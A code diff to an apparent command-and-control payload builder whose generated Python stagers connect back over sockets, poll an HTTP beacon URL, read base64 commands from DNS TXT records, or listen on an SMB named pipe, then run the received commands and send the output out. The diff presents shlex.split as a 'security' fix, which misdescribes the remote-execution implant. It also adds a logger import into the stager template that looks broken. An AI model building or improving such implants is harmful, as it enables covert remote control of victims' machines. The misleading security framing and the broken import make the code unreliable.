@@ -99,6 +99,7 @@ class PayloadBuilder:
         stager_code = f'''
 import socket
 import subprocess
+import shlex
 import json
 import time
 
@@ -122,11 +123,20 @@ def connect_back():
             
             if data.strip() == 'exit':
                 break
-                
-            result = subprocess.run(data, shell=True, capture_output=True, text=True)
+            
+            # SECURITY: shell=False + shlex.split prevents command injection
+            # via shell metacharacters in operator-supplied commands.
+            try:
+                result = subprocess.run(
+                    shlex.split(data), shell=False,
+                    capture_output=True, text=True
+                )
+            except (ValueError, FileNotFoundError) as e:
+                result_obj = type('R', (), {{'stdout': '', 'stderr': str(e)}})()
+                result = result_obj
             response = result.stdout + result.stderr
             s.send(response.encode())
-    except:
+    except Exception:
         pass
     finally:
         s.close()
@@ -150,6 +160,7 @@ if __name__ == "__main__":
         stager_code = f'''
 import requests
 import subprocess
+import shlex
 import json
 import time
 import random
@@ -176,12 +187,19 @@ def beacon():
             if response.status_code == 200:
                 command = response.text.strip()
                 if command and command != 'noop':
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                    output = result.stdout + result.stderr
+                    # SECURITY: shell=False + shlex.split prevents injection
+                    try:
+                        result = subprocess.run(
+                            shlex.split(command), shell=False,
+                            capture_output=True, text=True
+                        )
+                        output = result.stdout + result.stderr
+                    except (ValueError, FileNotFoundError) as e:
+                        output = str(e)
                     
                     requests.post(BEACON_URL + "/result",
                                 data={{"output": output, "fingerprint": METADATA['fingerprint']}})
-        except:
+        except Exception:
             continue
 
 if __name__ == "__main__":
@@ -206,6 +224,7 @@ if __name__ == "__main__":
         stager_code = f'''
 import dns.resolver
 import subprocess
+import shlex
 import base64
 import json
 import time
@@ -228,11 +247,18 @@ def dns_beacon():
             for answer in answers:
                 command = base64.b64decode(str(answer).strip('"')).decode()
                 if command:
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                    # SECURITY: shell=False + shlex.split prevents injection
+                    try:
+                        result = subprocess.run(
+                            shlex.split(command), shell=False,
+                            capture_output=True, text=True
+                        )
+                    except (ValueError, FileNotFoundError):
+                        pass
                     # Send result back via DNS (implementation depends on DNS server)
                     
             time.sleep(60)  # DNS is slow, longer intervals
-        except:
+        except Exception:
             time.sleep(60)
 
 if __name__ == "__main__":
@@ -253,8 +279,10 @@ if __name__ == "__main__":
 import win32pipe
 import win32file
 import subprocess
+import shlex
 import json
 import time
+from app.core.logger import logger
 
 METADATA = {json.dumps(metadata.__dict__)}
 PIPE_NAME = r"\\\\.\pipe\\{pipe_name}"
@@ -283,12 +311,19 @@ def smb_beacon():
                     if command == 'exit':
                         break
                     
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                    response = result.stdout + result.stderr
+                    # SECURITY: shell=False + shlex.split prevents injection
+                    try:
+                        proc = subprocess.run(
+                            shlex.split(command), shell=False,
+                            capture_output=True, text=True
+                        )
+                        response = proc.stdout + proc.stderr
+                    except (ValueError, FileNotFoundError) as e:
+                        response = str(e)
                     win32file.WriteFile(handle, response.encode())
                     
             win32file.CloseHandle(handle)
-        except:
+        except Exception:
             time.sleep(30)
 
 if __name__ == "__main__":
